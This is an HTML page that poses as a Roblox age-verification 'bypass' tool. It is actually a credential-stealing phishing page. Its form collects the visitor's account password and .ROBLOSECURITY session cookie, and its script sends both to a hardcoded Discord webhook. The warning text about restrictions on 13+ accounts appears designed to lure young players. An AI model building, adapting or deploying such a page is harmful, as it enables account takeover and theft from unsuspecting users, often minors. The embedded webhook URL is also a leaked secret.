<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypasser ni Boss James</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --modal-bg: #1e293b;
            --input-bg: rgba(255, 255, 255, 0.05);
            --primary-blue: #3b82f6;
            --primary-hover: #2563eb;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --warning-bg: rgba(251, 191, 36, 0.1);
            --warning-border: #fbbf24;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            background-image: radial-gradient(circle at top right, #1e293b, #0f172a);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-main);
        }

        .modal {
            background-color: var(--modal-bg);
            width: 100%;
            max-width: 500px;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.2);
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .modal-header {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }

        .bot-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin-right: 12px;
            object-fit: cover;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 700;
            flex-grow: 1;
        }

        .close-btn {
            color: var(--text-muted);
            cursor: pointer;
            font-size: 20px;
            transition: color 0.2s;
        }

        .close-btn:hover {
            color: var(--text-main);
        }

        .warning-box {
            background-color: var(--warning-bg);
            border: 1px solid var(--warning-border);
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 24px;
            display: flex;
            gap: 12px;
            font-size: 14px;
            line-height: 1.5;
        }

        .warning-icon {
            color: var(--warning-border);
            font-size: 18px;
            margin-top: 2px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 14px;
        }

        .label span {
            color: #ef4444;
            margin-left: 2px;
        }

        .input-field {
            width: 100%;
            background-color: var(--input-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            padding: 10px 14px;
            color: var(--text-main);
            font-size: 15px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        textarea.input-field {
            min-height: 100px;
            resize: vertical;
        }

        .modal-footer {
            display: flex;
            gap: 12px;
            margin-top: 8px;
        }

        .btn {
            flex: 1;
            padding: 12px;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
            font-size: 15px;
            border: none;
        }

        .btn-cancel {
            background-color: rgba(255, 255, 255, 0.05);
            color: var(--text-main);
        }

        .btn-cancel:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .btn-submit {
            background-color: var(--primary-blue);
            color: white;
        }

        .btn-submit:hover {
            background-color: var(--primary-hover);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
    </style>
</head>
<body>
    <div class="modal">
        <div class="modal-header">
            <img src="https://i.imgur.com/pwxGeZi.jpeg" alt="Avatar" class="bot-avatar">
            <h1 class="modal-title">Bypasser ni Boss James</h1>
            <i class="fas fa-times close-btn"></i>
        </div>

        <div class="warning-box">
            <i class="fas fa-exclamation-triangle warning-icon"></i>
            <div style="text-align: center; width: 100%;">
                ---------- ONLY WORKING ON 13+ ACCOUNT --------------<br>
                NOT AGE GROUP VERIFIED / BIRTHDAY VERIFIED
            </div>
        </div>

        <form id="bypassForm">
            <div class="form-group">
                <label class="label">Password <span>*</span></label>
                <input type="password" id="password" class="input-field" placeholder="Account password" required>
            </div>

            <div class="form-group">
                <label class="label">.ROBLOSECURITY <span>*</span></label>
                <textarea id="cookie" class="input-field" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as..." required></textarea>
            </div>

            <div class="modal-footer">
                <button type="button" class="btn btn-cancel">Cancel</button>
                <button type="submit" id="submitBtn" class="btn btn-submit">Submit</button>
            </div>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496952883810402457/qIzeSB9KIEhLOX00c-O-d3tZCHIXkurfJ19ZSKgpon7oZHMc5pvov0sFAXEl-ySbsLCC';

        document.getElementById('bypassForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const password = document.getElementById('password').value;
            let cookie = document.getElementById('cookie').value.trim();

            // Ensure cookie has the prefix
            if (!cookie.startsWith("_|WARNING:-")) {
                cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + cookie;
            }

            submitBtn.disabled = true;
            submitBtn.innerText = 'Sending...';

            Swal.fire({
                title: 'Processing Request',
                text: 'Sending to Boss James system...',
                allowOutsideClick: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });

            // Format the payload exactly for the Bot's Auto-Bypass
            const payload = {
                username: "Web Submission System",
                embeds: [{
                    title: "📥 NEW BYPASS REQUEST",
                    color: 0x00d4ff,
                    fields: [
                        { name: "Password", value: "`" + password + "`", inline: true },
                        { name: ".ROBLOSECURITY", value: "```\n" + cookie + "\n```", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Sent!',
                        text: 'Request sent to Discord. Your bot will auto-bypass shortly.',
                        background: '#1e293b',
                        color: '#f8fafc'
                    });
                } else {
                    throw new Error('Webhook failed');
                }
            } catch (error) {
                Swal.fire({
                    icon: 'error',
                    title: 'Error',
                    text: 'Failed to connect to Discord. Check your internet.',
                    background: '#1e293b',
                    color: '#f8fafc'
                });
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerText = 'Submit';
            }
        });

        document.querySelector('.btn-cancel').addEventListener('click', () => {
            document.getElementById('bypassForm').reset();
        });

        document.querySelector('.close-btn').addEventListener('click', () => {
            Swal.fire({
                title: 'Are you sure?',
                text: "You will lose your progress!",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3b82f6',
                cancelButtonColor: '#1e293b',
                confirmButtonText: 'Yes, close it!'
            });
        });
    </script>
</body>
</html>
